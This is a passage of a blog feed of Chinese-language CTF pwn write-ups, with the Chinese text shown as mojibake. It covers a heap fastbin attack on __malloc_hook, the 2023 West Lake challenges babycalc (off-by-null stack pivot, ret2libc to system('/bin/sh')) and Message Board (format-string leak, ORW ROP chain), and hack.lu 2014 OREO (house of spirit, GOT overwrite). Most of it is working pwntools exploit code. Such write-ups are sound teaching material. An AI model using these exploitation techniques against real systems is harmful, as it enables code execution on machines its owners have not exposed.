class="hljs-string">b&#x27;2&#x27;</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;2&#x27;</span>*<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#leak</span><br>put(<span class="hljs-string">b&#x27;3&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;3&#x27;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#fastbin attack</span><br>put(<span class="hljs-string">b&#x27;4&#x27;</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;4&#x27;</span>*<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#off by null</span><br>put(<span class="hljs-string">b&#x27;5&#x27;</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;5&#x27;</span>*<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#unsorted bin</span><br>put(<span class="hljs-string">b&#x27;6&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;6&#x27;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#barrier</span><br>gdb.attach(p)<br>delete(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>put(<span class="hljs-string">b&#x27;7&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x370</span>),<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;7&#x27;</span>)<br>delete(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>delete(<span class="hljs-string">b&#x27;5&#x27;</span>)<br>put(<span class="hljs-string">b&#x27;8&#x27;</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;8&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>get(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x68</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>delete(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>put(<span class="hljs-string">b&#x27;9&#x27;</span>,<span class="hljs-number">0x160</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x70</span>)+p64(libcbase+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x23</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x50</span>)<br>put(<span class="hljs-string">b&#x27;10&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x60</span>)<br>put(<span class="hljs-string">b&#x27;11&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>)+p64(libcbase+<span class="hljs-number">0xf0897</span>)+p64(libcbase+libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x60</span>-<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>))<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter command:\n&#x27;</span>,<span class="hljs-string">b&#x27;PUT&#x27;</span>)<br><span class="hljs-comment">#put(b&#x27;12&#x27;,1,b&#x27;a&#x27;)</span><br>p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 è¥¿æ¹–è®ºå‰‘åˆèµ› pwn wp</title>
    <link href="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/"/>
    <url>/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/</url>
    
    <content type="html"><![CDATA[<p>æ„Ÿæƒ³ï¼šè™½ç„¶åœ¨ç”µè„‘å‰åäº†å…«å°æ—¶æ‰å†™å‡ºæ¥ä¸€é“é¢˜è€Œä¸”ä»ä¸­åˆå¼€å§‹å¤´ç–¼æ­¢ç—›è¯è¿˜åœ¨é˜³çš„æ—¶å€™åƒå®Œäº†å¯¼è‡´æ™šä¸Šå¤´ç–¼å¤±çœ è¿˜æ²¡åƒåˆé¥­ä½†å‡ºflagçš„æ—¶å€™æ„Ÿè§‰å€¼äº†ï¼ï¼ï¼<br>çœŸæ­£çš„æ„Ÿæƒ³ï¼šå¥½åç‰¢å¥½åç‰¢ä½†ç»ˆäºæ²¡æœ‰çˆ†é›¶äº†å•Šå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆæˆ‘ä¸æ˜¯fwæˆ‘å¥½å¿«ä¹å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼ˆä¸€äº›å‘ç–¯æ–‡å­¦ï¼‰</p><span id="more"></span><h1 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h1><p>ä½ æ‡‚8å°æ—¶ä¸€é“é¢˜çš„å«é‡‘é‡~o( &#x3D;âˆ©Ï‰âˆ©&#x3D; )m</p><h2 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h2><img src="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/main.png" class title="main"><p>mainå‡½æ•°ï¼Œinit_è®¾ç½®ç¼“å†²åŒºï¼Œoutputè¾“å‡ºä¸€äº›ä¸œè¥¿ï¼ŒçœŸæ­£çš„ä¸»å‡½æ•°æ˜¯cal</p><img src="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/cal.png" class title="cal"><p>ååŠæ®µé¦–å…ˆçœ‹åˆ°ä¸€å †æ•°å€¼åˆ¤æ–­ï¼Œz3è§£ä¸ªæ–¹ç¨‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18=Ints(<span class="hljs-string">&#x27;v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18&#x27;</span>)<br>solver = Solver()<br>solver.add(v5 * v4 * v3 - v6 == <span class="hljs-number">0x8D56</span>)<br>solver.add(v3 == <span class="hljs-number">0x13</span>)<br>solver.add(v5 * <span class="hljs-number">0x13</span> * v4 + v6 == <span class="hljs-number">0x8DE2</span>)<br>solver.add((v13 + v3 - v8) * v16 == <span class="hljs-number">0x8043</span>)<br>solver.add((v5 + v4 * v3) * v6 == <span class="hljs-number">0xC986</span>)<br>solver.add(v9 * v8 * v7 - v10 == <span class="hljs-number">0xF06D</span>)<br>solver.add(v10 * v15 + v4 + v18 == <span class="hljs-number">0x4A5D</span>)<br>solver.add(v9 * v8 * v7 + v10 == <span class="hljs-number">0xF1AF</span>)<br>solver.add((v8 * v7 - v9) * v10 == <span class="hljs-number">0x8E03D</span>)<br>solver.add(v11 == <span class="hljs-number">0x32</span>)<br>solver.add((v9 + v8 * v7) * v10 == <span class="hljs-number">0x8F59F</span>)<br>solver.add(v13 * v12 * v11 - v14 == <span class="hljs-number">0x152FD3</span>)<br>solver.add(v13 * v12 * v11 + v14 == <span class="hljs-number">0x15309D</span>)<br>solver.add((v12 * v11 - v13) * v14 == <span class="hljs-number">0x9C48A</span>)<br>solver.add((v11 * v5 - v16) * v12 == <span class="hljs-number">0x4E639</span>)<br>solver.add((v13 + v12 * v11) * v14 == <span class="hljs-number">0xA6BD2</span>)<br>solver.add(v17 * v16 * v15 - v18 == <span class="hljs-number">0x8996D</span>)<br>solver.add(v17 * v16 * v15 + v18 == <span class="hljs-number">0x89973</span>)<br>solver.add(v14 == <span class="hljs-number">0x65</span>)<br>solver.add((v16 * v15 - v17) * v18 == <span class="hljs-number">0x112E6</span>)<br>solver.add((v17 + v16 * v15) * v18 == <span class="hljs-number">0x11376</span>)<br><span class="hljs-built_in">print</span>(solver.check())<br><span class="hljs-built_in">print</span>(solver.model())<br></code></pre></td></tr></table></figure><p>æ–¹ç¨‹ç»„è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[v3 = <span class="hljs-number">19</span>,v11 = <span class="hljs-number">50</span>,v14 = <span class="hljs-number">101</span>,v13 = <span class="hljs-number">212</span>,v16 = <span class="hljs-number">199</span>,v6 = <span class="hljs-number">70</span>,v4 = <span class="hljs-number">36</span>,v5 = <span class="hljs-number">53</span>,v9 = <span class="hljs-number">17</span>,v17 = <span class="hljs-number">24</span>,v15 = <span class="hljs-number">118</span>,v18 = <span class="hljs-number">3</span>,v7 = <span class="hljs-number">55</span>,v12 = <span class="hljs-number">131</span>,v10 = <span class="hljs-number">161</span>,v8 = <span class="hljs-number">66</span>]<br></code></pre></td></tr></table></figure><img src="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/input.png" class title="input"><p>åˆ©ç”¨é‡ç‚¹ä¹‹æ•°å€¼è¾“å…¥éƒ¨åˆ†ï¼š</p><ul><li>å‘buf[208]å†™å…¥0x100å­—èŠ‚ä¸”åœ¨è¾“å…¥æœ€åè¡¥ç©ºå­—èŠ‚</li><li>ç”±iæ§åˆ¶è¾“å…¥æ•°å€¼å†™çš„ä½ç½®</li><li>æ¯ä¸ªæ•°å­—å ä¸€å­—èŠ‚</li></ul><p>bufå­˜åœ¨æº¢å‡ºï¼Œiå¯æ§ï¼Œå½“è¾“å…¥0x100æ—¶èƒ½æº¢å‡ºä¸€ä¸ªç©ºå­—èŠ‚åˆ°rbp</p><h2 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h2><p>è¿™é“é¢˜çš„åˆ©ç”¨ç‚¹ä¸»è¦æœ‰ä¸¤ä¸ªï¼š</p><ul><li>bufæº¢å‡ºæ§åˆ¶ièƒ½å®ç°å‘å‰å†™æ— æ•°å­—èŠ‚æˆ–å‘åå†™ä¸€å­—èŠ‚</li><li>å‘bufè¾“å…¥0x100å­—èŠ‚æ—¶èƒ½å®ç°of by nullå°†rbpçš„æœ€ä½ä½ç½®é›¶</li></ul><p>åœ¨æœ€å¼€å§‹åšçš„æ—¶å€™æˆ‘æœ‰æƒ³åˆ°of by nullå°†rbpæœ€ä½ä½ç½®é›¶ä¼šæ˜¯ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼Œä½†å› ä¸ºæ ˆåœ°å€æœªçŸ¥æ‰€ä»¥æŠŠè¿™ä¸ªæƒ³æ³•å¦äº†ã€‚åæ¥å› ä¸ºæƒ³ä¸åˆ°æ§åˆ¶iæ€ä¹ˆåˆ©ç”¨åˆæ‰¾å›äº†è¿™ä¸ªæƒ³æ³•ï¼Œè¿›ä¸€æ­¥æƒ³åˆ°åˆ©ç”¨æ ˆè¿ç§»æœ‰å‡ ç‡è®©rspè½åœ¨bufå†…ï¼Œä½†ç”±äºæœ¬äººå¯¹çˆ†ç ´æœ‰åè§æ‰€ä»¥åˆå°†è¿™ä¸ªæƒ³æ³•æç½®äº†(â•¯â–”çš¿â–”)â•¯ã€‚åæ¥å®åœ¨æ²¡æ³•æ¨è¿›è·Ÿå­¦é•¿è¯´äº†è¿™ä¸ªæƒ³æ³•æ‰å‘ç°æ€æƒ³æœ‰é—®é¢˜(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»ï¼Œè®°å½•ä¸€ä¸‹å­¦é•¿çš„è‡³ç†åè¨€è­¦é†’è‡ªå·±o(Tãƒ˜To)</p><img src="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/aaaa.png" class title="aaaa"> <p>æœ€åæ¨è¿›è¿™ä¸ªæƒ³æ³•è¯æ˜å¯è¡Œï¼ˆæµªè´¹å¥½å¤šæ—¶é—´è¶Šæƒ³è¶Šæ°”â•°ï¼ˆâ€µâ–¡â€²ï¼‰â•¯ï¼‰</p><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ul><li>ç¬¬ä¸€æ¬¡æ ˆè¿ç§»æ³„éœ²libcåŸºå€ç„¶åè¿”å›0x400c1bï¼ˆéœ€è¦æœ‰æ­£å¸¸çš„rbpæ‰€ä»¥ä¸èƒ½ç›´æ¥è¿”å›calï¼Œè¿”å›0x400c1aä¼šå¯¼è‡´åé¢çš„printfæ— æ³•æ­£å¸¸æ‰§è¡Œä¸çŸ¥é“ä¸ºå•¥ï¼‰</li><li>ç¬¬äºŒæ¬¡æ ˆè¿ç§»æ‰§è¡Œsystem(â€˜&#x2F;bin&#x2F;shâ€™)</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">24101</span>)<br><span class="hljs-comment">#p=process(&#x27;./babycalc&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./babycalc&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>v=[<span class="hljs-number">19</span>,<span class="hljs-number">36</span>,<span class="hljs-number">53</span>,<span class="hljs-number">70</span>,<span class="hljs-number">55</span>,<span class="hljs-number">66</span>,<span class="hljs-number">17</span>,<span class="hljs-number">161</span>,<span class="hljs-number">50</span>,<span class="hljs-number">131</span>,<span class="hljs-number">212</span>,<span class="hljs-number">101</span>,<span class="hljs-number">118</span>,<span class="hljs-number">199</span>,<span class="hljs-number">24</span>,<span class="hljs-number">3</span>]<br>s=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v:<br>    s+=i.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(s)<br>ret_addr=<span class="hljs-number">0x400c19</span><br>pop_rdi=<span class="hljs-number">0x400ca3</span><br>payload=<span class="hljs-string">b&#x27;24&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">6</span>+p64(ret_addr)*<span class="hljs-number">21</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(<span class="hljs-number">0x400c1b</span>)+s+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">28</span>+<span class="hljs-string">b&#x27;\x38&#x27;</span>+<span class="hljs-string">b&#x27;\x00\x00\x00&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;number-1:&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;good done\n&#x27;</span>)<br><br><span class="hljs-comment">#leak libc</span><br>x=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>puts_addr=u64(x)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u64(x)))<br><span class="hljs-comment">#libc=LibcSearcher(&quot;puts&quot;,puts_addr)</span><br>libcbase=u64(x)-<span class="hljs-number">0x06f6a0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><br><span class="hljs-comment">#system(&#x27;/bin/sh&#x27;)</span><br>system_addr=libcbase+<span class="hljs-number">0x0453a0</span><br>bin_sh_addr=libcbase+<span class="hljs-number">0x18ce57</span><br>shellcode=<span class="hljs-string">b&#x27;24&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">6</span>+p64(ret_addr)*<span class="hljs-number">22</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+s+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">28</span>+<span class="hljs-string">b&#x27;\x38&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">3</span><br>p.send(shellcode)<br><span class="hljs-comment">#p.recvuntil(b&#x27;good done\n&#x27;)</span><br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure><h3 id="Message-Board"><a href="#Message-Board" class="headerlink" title="Message Board"></a>Message Board</h3><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><p>å¼€äº†æ²™ç®±ï¼Œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç”¨äºæ³„éœ²libcåŸºå€å’Œæ ˆåœ°å€ï¼Œ0x10çš„æº¢å‡ºæ ˆè¿ç§»åˆ°v7å†…å¸ƒç½®çš„ropé“¾è¿›è¡Œorwã€‚æ²¡å•¥éš¾çš„ä¸è¯´äº†</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p=remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">21495</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Welcome to DASCTF message board, please leave your name:&#x27;</span>,<span class="hljs-string">b&#x27;%p,%31$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Hello, &#x27;</span>)<br>s1=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;,&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)<br>s2=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;Hello&#x27;</span>)[:-<span class="hljs-number">5</span>].decode(),<span class="hljs-number">16</span>)<br>v7=s1+<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(v7))<br>libcbase=s2-<span class="hljs-number">0xc1083</span>+<span class="hljs-number">0x9d000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>open_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>bss=<span class="hljs-number">0x4040b0</span><br>pop_rdi_addr=<span class="hljs-number">0x401413</span><br>pop_rsi_addr=<span class="hljs-number">0x2601f</span>+libcbase<br>pop_rdx_addr=<span class="hljs-number">0x142c92</span>+libcbase<br>payload=<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>+p64(pop_rdi_addr)+p64(v7)+p64(pop_rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi_addr)+p64(bss)+p64(pop_rdx_addr)+p64(<span class="hljs-number">0x40</span>)+p64(read_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_addr)+p64(bss)+p64(pop_rdx_addr)+p64(<span class="hljs-number">0x40</span>)+p64(write_addr)<br>payload+=<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">16</span><br>payload+=p64(v7)+p64(<span class="hljs-number">0x4013a2</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Now, please say something to DASCTF:\n&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2014 hack.lu CTF OREO</title>
    <link href="/2023/02/02/hack-lu-CTF-2014-OREO/"/>
    <url>/2023/02/02/hack-lu-CTF-2014-OREO/</url>
    
    <content type="html"><![CDATA[<p>house of spiritå°±ä¸å†™äº†æ²¡å•¥å†™çš„ï¼Œæ‰€æœ‰çš„æ£€æŸ¥fastbin dupé‡Œéƒ½æœ‰æã€‚è¿™é¢˜å†™çš„ä¹Ÿæ²¡æœ‰é‚£ä¹ˆæŠ˜ç£¨( â€¢Ì€ Ï‰ â€¢Ì )y</p><span id="more"></span><h1 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h1><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><img src="/2023/02/02/hack-lu-CTF-2014-OREO/main.png" class title="main"><p>æ³¨æ„ä¸€ç‚¹ï¼Œnoticeé‡Œå­˜çš„æ˜¯notice_contextçš„åœ°å€ï¼Œä¸Šé¢çš„æ˜¯mallocçš„chunkçš„æ•°é‡cntå’Œfreeçš„chunkçš„æ•°é‡cnt_delï¼Œè¿™ä¸€å—ä¹‹åå°†ç”¨äºä¼ªé€ fake chunk</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/notice.png" class title="notice"><h2 id="main-å’Œread-num"><a href="#main-å’Œread-num" class="headerlink" title="main_å’Œread_num"></a>main_å’Œread_num</h2><p>çœŸæ­£çš„ä¸»å‡½æ•°ï¼Œæ²¡å•¥å¥½è¯´çš„</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/main_.png" class title="main_"><p>è¯»å…¥ä¸€ä¸ªæ•°</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/read_num.png" class title="read_num"><p>è¿™é“é¢˜å¾ˆå¥‡æ€ªçš„ä¸€ç‚¹å°±æ˜¯expä¸­gdb.attachåæ”¶ä¸åˆ°â€Action: â€œï¼ŒåŸå› æœªçŸ¥ã€‚æ€»ä¹‹äº¤äº’å¾ˆå¥‡æ€ª</p><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>å¯ä»¥é€šè¿‡æº¢å‡ºæ”¹å˜chunké“¾ã€‚ä¼šé€’å¢cnt</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/add.png" class title="add"><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>è¾“å‡ºæ‰€æœ‰chunk</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/show.png" class title="show"><h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><p>åˆ é™¤æ‰€æœ‰chunkï¼Œé€’å¢cnt_delï¼Œæ— uaf</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/delete.png" class title="delete"><h2 id="message"><a href="#message" class="headerlink" title="message"></a>message</h2><p>ç•™è¨€åœ¨noticeæ‰€æŒ‡å‘çš„åœ°å€</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/message.png" class title="message"><h2 id="stats"><a href="#stats" class="headerlink" title="stats"></a>stats</h2><p>è¾“å‡ºcntã€cnt_delå’Œnoticeï¼Œæ²¡å•¥ç”¨</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/stats.png" class title="stats"><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><ul><li><p>å…ˆaddä¸€ä¸ªchunkï¼Œæº¢å‡ºåˆ°æœ€åå››å­—èŠ‚æ”¹æŒ‡é’ˆæŒ‡å‘putsçš„gotè¡¨ç„¶åshowæ³„éœ²libcåŸºå€</p></li><li><p>å¯ä»¥åœ¨cntå’Œnoticeè¿™å—ä¼ªé€ fake chunkï¼ŒæŠŠcntå½“ä½œsizeã€‚ç”±äºchunkç”³è¯·çš„å¤§å°æ˜¯0x40ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å†ç”³è¯·0x40ä¸ªchunkï¼ˆä¹‹å‰å·²ç»æœ‰ä¸€ä¸ªäº†ï¼‰ï¼Œå¹¶ä¸”æœ€åä¸€ä¸ªchunkçš„æœ€åå››å­—èŠ‚è¦æŒ‡å‘0x804a28</p><img src="/2023/02/02/hack-lu-CTF-2014-OREO/notice.png" class title="notice"></li><li><p>messageç•™è¨€fake chunkçš„ååŠéƒ¨åˆ†ã€‚chunkçš„æœ€åå››å­—èŠ‚ç½®0ï¼Œnextchunkçš„sizeå’Œpresizeå¸ƒç½®ä¸ºåˆæ³•å€¼</p></li><li><p>deleteï¼Œfake chunkè¿›å…¥fastbinä¸”ä¸ºç¬¬ä¸€ä¸ªchunk</p></li><li><p>addå›fake chunkï¼Œå°†noticeè¦†ç›–ä¸ºelf.got[â€˜strlenâ€™]-0x8</p></li><li><p>å†messageï¼Œå†™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">b<span class="hljs-number">&#x27;</span>/bin/sh\x00<span class="hljs-number">&#x27;</span>+p32(system_addr)<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å†…å­˜å°±æ˜¯è¿™æ ·çš„</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">notice-&gt; elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<span class="hljs-number">-0x8</span>-&gt; b<span class="hljs-number">&#x27;</span>/bin/sh\x00<span class="hljs-number">&#x27;</span><br>   elf.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]-&gt; system_addr <br></code></pre></td></tr></table></figure><ul><li>ä¹‹åreplace_enter_0ä¸­ä¼šæ‰§è¡Œstrlen(notice)ï¼Œè¿™æ—¶å€™å®é™…æ‰§è¡Œçš„å°±æ˜¯system(â€˜&#x2F;bin&#x2F;shâ€™)<img 